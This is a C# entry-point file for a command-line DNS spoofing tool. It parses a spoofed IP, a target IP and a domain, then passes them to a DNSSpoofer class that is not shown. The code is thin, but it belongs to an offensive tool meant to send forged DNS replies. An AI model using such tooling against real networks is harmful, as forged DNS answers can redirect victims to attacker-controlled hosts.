namespace Dns_Spoof
{
    internal class Program
    {
        static byte[] ConvertStrIPToBytes(string ip)
        {
            byte[] bytesIP = new byte[4];
            string[] sections = ip.Split('.');
            int counter = 0;

            for (int i = 0; i < sections.Length; i++)
            {
                bytesIP[counter] = Convert.ToByte(sections[i]);
                counter++;
            }

            return bytesIP;
        }

        static void Main(string[] args)
        {
            if(args.Length == 3)
            {
                var spoofIP = ConvertStrIPToBytes(args[0]);
                var recvIP = ConvertStrIPToBytes(args[1]);
                DNSSpoofer.SendDNSReplayRequest(args[2], spoofIP, recvIP);
                Console.WriteLine("Sent DNS Replay to {1} as {0}", args[0], args[1]);
            }
            else
            {
                Console.WriteLine("Usage: dns_spoof <spoof-ip> <recv-ip> <spoof-domain>");
            }
        }
    }
}